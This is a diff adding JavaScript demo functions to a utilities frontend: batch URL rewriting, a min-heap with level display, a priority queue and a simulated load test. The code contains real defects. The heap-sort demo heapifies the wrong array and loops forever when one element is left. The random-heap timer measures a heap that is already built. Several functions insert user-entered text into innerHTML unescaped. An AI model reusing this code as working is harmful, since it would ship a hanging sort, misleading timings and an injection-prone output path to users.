+            const input = document.getElementById('urlBatchInput').value;
+            const operation = document.getElementById('urlBatchOperation').value;
+            const resultBox = document.getElementById('urlBatchResult');
+            
+            if (!input) {
+                showNotification('Please enter URLs', 'warning');
+                return;
+            }
+            
+            const urls = input.split('\n').filter(url => url.trim());
+            let results = [];
+            
+            urls.forEach(url => {
+                let processed = url.trim();
+                
+                switch (operation) {
+                    case 'ensure-https':
+                        if (!processed.startsWith('http')) {
+                            processed = 'https://' + processed;
+                        } else if (processed.startsWith('http://')) {
+                            processed = processed.replace('http://', 'https://');
+                        }
+                        break;
+                    case 'normalize':
+                        try {
+                            const urlObj = new URL(processed.startsWith('http') ? processed : 'https://' + processed);
+                            processed = urlObj.origin;
+                        } catch (e) {
+                            processed = 'INVALID URL';
+                        }
+                        break;
+                    case 'strip-protocol':
+                        processed = processed.replace(/^https?:\/\//, '');
+                        break;
+                    case 'validate':
+                        try {
+                            new URL(processed.startsWith('http') ? processed : 'https://' + processed);
+                            processed += ' ✅';
+                        } catch (e) {
+                            processed += ' ❌';
+                        }
+                        break;
+                }
+                
+                results.push(processed);
+            });
+            
+            resultBox.innerHTML = `Batch ${operation} Results:\n\n${results.join('\n')}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        // Data Structures functions
+        let minHeap = [];
+
+        function buildHeap() {
+            const input = document.getElementById('heapInsert').value;
+            const resultBox = document.getElementById('heapVisualization');
+            
+            if (!input) {
+                showNotification('Please enter values', 'warning');
+                return;
+            }
+            
+            const values = input.split(',').map(v => parseInt(v.trim())).filter(v => !isNaN(v));
+            minHeap = [...values];
+            heapify();
+            
+            resultBox.innerHTML = `Heap Built:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function heapify() {
+            for (let i = Math.floor(minHeap.length / 2) - 1; i >= 0; i--) {
+                siftDown(i);
+            }
+        }
+
+        function siftDown(index) {
+            const leftChild = 2 * index + 1;
+            const rightChild = 2 * index + 2;
+            let smallest = index;
+            
+            if (leftChild < minHeap.length && minHeap[leftChild] < minHeap[smallest]) {
+                smallest = leftChild;
+            }
+            
+            if (rightChild < minHeap.length && minHeap[rightChild] < minHeap[smallest]) {
+                smallest = rightChild;
+            }
+            
+            if (smallest !== index) {
+                [minHeap[index], minHeap[smallest]] = [minHeap[smallest], minHeap[index]];
+                siftDown(smallest);
+            }
+        }
+
+        function siftUp(index) {
+            while (index > 0) {
+                const parentIndex = Math.floor((index - 1) / 2);
+                if (minHeap[parentIndex] <= minHeap[index]) break;
+                
+                [minHeap[parentIndex], minHeap[index]] = [minHeap[index], minHeap[parentIndex]];
+                index = parentIndex;
+            }
+        }
+
+        function insertHeapValue() {
+            const value = parseInt(document.getElementById('heapInsert').value);
+            const resultBox = document.getElementById('heapVisualization');
+            
+            if (isNaN(value)) {
+                showNotification('Please enter a valid number', 'warning');
+                return;
+            }
+            
+            minHeap.push(value);
+            siftUp(minHeap.length - 1);
+            
+            resultBox.innerHTML = `Inserted ${value}:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function extractHeapMin() {
+            const count = parseInt(document.getElementById('heapExtract').value);
+            const resultBox = document.getElementById('heapVisualization');
+            
+            if (minHeap.length === 0) {
+                showNotification('Heap is empty', 'warning');
+                return;
+            }
+            
+            const extracted = [];
+            for (let i = 0; i < Math.min(count, minHeap.length); i++) {
+                if (minHeap.length === 1) {
+                    extracted.push(minHeap.pop());
+                } else {
+                    const min = minHeap[0];
+                    minHeap[0] = minHeap.pop();
+                    siftDown(0);
+                    extracted.push(min);
+                }
+            }
+            
+            resultBox.innerHTML = `Extracted: [${extracted.join(', ')}]\n\nRemaining Heap:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function clearHeap() {
+            minHeap = [];
+            const resultBox = document.getElementById('heapVisualization');
+            resultBox.innerHTML = 'Heap cleared';
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box info';
+        }
+
+        function visualizeHeap() {
+            if (minHeap.length === 0) return 'Empty Heap';
+            
+            let result = '';
+            let level = 0;
+            let startIndex = 0;
+            
+            while (startIndex < minHeap.length) {
+                const levelSize = Math.pow(2, level);
+                const levelValues = minHeap.slice(startIndex, startIndex + levelSize);
+                result += `Level ${level}: [${levelValues.join(', ')}]\n`;
+                startIndex += levelSize;
+                level++;
+            }
+            
+            return result.trim();
+        }
+
+        function generateRandomHeap() {
+            const size = parseInt(document.getElementById('randomDataSize').value);
+            const resultBox = document.getElementById('heapDemoResult');
+            
+            const randomValues = Array.from({ length: size }, () => Math.floor(Math.random() * 100) + 1);
+            minHeap = [...randomValues];
+            heapify();
+            
+            const startTime = performance.now();
+            heapify();
+            const endTime = performance.now();
+            
+            resultBox.innerHTML = `Generated ${size} random values\n\nOriginal: [${randomValues.slice(0, 10).join(', ')}...]\nHeapified: [${minHeap.slice(0, 10).join(', ')}...]\n\nHeapification time: ${(endTime - startTime).toFixed(4)}ms\n\nMin element: ${minHeap[0]}\nHeap size: ${minHeap.length}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function heapSortDemo() {
+            const size = parseInt(document.getElementById('randomDataSize').value);
+            const resultBox = document.getElementById('heapDemoResult');
+            
+            const data = Array.from({ length: size }, () => Math.floor(Math.random() * 100) + 1);
+            const startTime = performance.now();
+            
+            // Heap sort implementation
+            const heap = [...data];
+            heapify();
+            
+            const sorted = [];
+            while (heap.length > 0) {
+                sorted.push(heap[0]);
+                heap[0] = heap.pop();
+                siftDown(0);
+            }
+            
+            const endTime = performance.now();
+            
+            resultBox.innerHTML = `Heap Sort Demo\n\nOriginal (first 10): [${data.slice(0, 10).join(', ')}...]\nSorted (first 10): [${sorted.slice(0, 10).join(', ')}...]\n\nSort time: ${(endTime - startTime).toFixed(4)}ms\n\nVerification: ${isSorted(sorted) ? '✅ Sorted correctly' : '❌ Sort failed'}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function isSorted(arr) {
+            for (let i = 1; i < arr.length; i++) {
+                if (arr[i] < arr[i - 1]) return false;
+            }
+            return true;
+        }
+
+        function heapPerformanceTest() {
+            const size = parseInt(document.getElementById('randomDataSize').value);
+            const resultBox = document.getElementById('heapDemoResult');
+            
+            const iterations = 100;
+            const times = [];
+            
+            for (let i = 0; i < iterations; i++) {
+                const data = Array.from({ length: size }, () => Math.floor(Math.random() * 1000) + 1);
+                
+                const startTime = performance.now();
+                minHeap = [...data];
+                heapify();
+                const endTime = performance.now();
+                
+                times.push(endTime - startTime);
+            }
+            
+            const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
+            const minTime = Math.min(...times);
+            const maxTime = Math.max(...times);
+            
+            resultBox.innerHTML = `Heap Performance Test\n\nTest Size: ${size} elements\nIterations: ${iterations}\n\nResults:\nAverage: ${avgTime.toFixed(4)}ms\nMin: ${minTime.toFixed(4)}ms\nMax: ${maxTime.toFixed(4)}ms\n\nThroughput: ${(size / avgTime * 1000).toFixed(0)} elements/second`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        // Priority Queue functions
+        let priorityQueue = [];
+
+        function addPriorityTask() {
+            const name = document.getElementById('taskName').value;
+            const priority = parseInt(document.getElementById('taskPriority').value);
+            const resultBox = document.getElementById('priorityQueueResult');
+            
+            if (!name) {
+                showNotification('Please enter a task name', 'warning');
+                return;
+            }
+            
+            const task = { name, priority, timestamp: new Date().toISOString() };
+            priorityQueue.push(task);
+            
+            // Sort by priority (lower number = higher priority)
+            priorityQueue.sort((a, b) => a.priority - b.priority);
+            
+            resultBox.innerHTML = `Task Added:\n${JSON.stringify(task, null, 2)}\n\nQueue Size: ${priorityQueue.length}\n\nNext Task: ${priorityQueue[0]?.name || 'None'}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+            
+            // Clear input
+            document.getElementById('taskName').value = '';
+        }
+
+        function processNextTask() {
+            const resultBox = document.getElementById('priorityQueueResult');
+            
+            if (priorityQueue.length === 0) {
+                showNotification('No tasks in queue', 'warning');
+                return;
+            }
+            
+            const task = priorityQueue.shift();
+            
+            resultBox.innerHTML = `Processed Task:\n${JSON.stringify(task, null, 2)}\n\nRemaining Tasks: ${priorityQueue.length}\n\nNext Task: ${priorityQueue[0]?.name || 'None'}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function viewTaskQueue() {
+            const resultBox = document.getElementById('priorityQueueResult');
+            
+            if (priorityQueue.length === 0) {
+                resultBox.innerHTML = 'Task queue is empty';
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box info';
+                return;
+            }
+            
+            const queueDisplay = priorityQueue.map((task, index) => 
+                `${index + 1}. ${task.name} (Priority: ${task.priority})`
+            ).join('\n');
+            
+            resultBox.innerHTML = `Current Task Queue (${priorityQueue.length} tasks):\n\n${queueDisplay}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        // Load testing function
+        function runLoadTest() {
+            const users = parseInt(document.getElementById('loadUsers').value);
+            const requests = parseInt(document.getElementById('loadRequests').value);
+            const resultBox = document.getElementById('loadTestResult');
+            
+            const startTime = performance.now();
+            let totalRequests = 0;
+            let successfulRequests = 0;
+            const responseTimes = [];
+            
+            // Simulate load test
+            for (let i = 0; i < users; i++) {
+                for (let j = 0; j < requests; j++) {
+                    const requestStart = performance.now();
+                    totalRequests++;
+                    
+                    // Simulate API call with variable response time
+                    const responseTime = Math.random() * 100 + 50; // 50-150ms
+                    responseTimes.push(responseTime);
+                    
+                    // Simulate 95% success rate
+                    if (Math.random() > 0.05) {
+                        successfulRequests++;
+                    }
+                    
+                    // Simulate async wait
+                    while (performance.now() - requestStart < responseTime) {
+                        // Busy wait to simulate processing time
+                    }
+                }
+            }
+            
+            const endTime = performance.now();
+            const duration = endTime - startTime;
+            
+            // Calculate statistics
+            const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
+            const maxResponseTime = Math.max(...responseTimes);
+            const minResponseTime = Math.min(...responseTimes);
+            const p95ResponseTime = responseTimes.sort((a, b) => a - b)[Math.floor(responseTimes.length * 0.95)];
+            
+            resultBox.innerHTML = `Load Test Results:\n\nConcurrent Users: ${users}\nRequests per User: ${requests}\nTotal Requests: ${totalRequests}\nSuccessful: ${successfulRequests}\nSuccess Rate: ${((successfulRequests / totalRequests) * 100).toFixed(2)}%\n\nPerformance:\nDuration: ${duration.toFixed(2)}ms\nRequests/sec: ${(totalRequests / duration * 1000).toFixed(0)}\nAvg Response: ${avgResponseTime.toFixed(2)}ms\nMin Response: ${minResponseTime.toFixed(2)}ms\nMax Response: ${maxResponseTime.toFixed(2)}ms\n95th Percentile: ${p95ResponseTime.toFixed(2)}ms`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
         // Initialize demo with some sample data
         window.addEventListener('load', function() {
             // Set today's date as default
@@ -1465,6 +2681,15 @@
             // Add sample objects for merging
             document.getElementById('object1').value = JSON.stringify({ a: 1, b: 2, user: { name: "John" } }, null, 2);
             document.getElementById('object2').value = JSON.stringify({ b: 3, c: 4, user: { age: 30 } }, null, 2);
+            
+            // Add sample URL data
+            document.getElementById('protocolInput').value = "example.com";
+            document.getElementById('urlParseInput').value = "https://api.example.com/v1/users?page=1&limit=10";
+            document.getElementById('urlValidateInput').value = "https://secure.example.com/path";
+            document.getElementById('urlBatchInput').value = "example.com\nhttps://test.com\nhttp://api.example.com";
+            
+            // Add sample heap data
+            document.getElementById('heapInsert').value = "5, 3, 8, 1, 9, 2";
             
             console.log('QGenUtils Demo Frontend initialized successfully!');
         });
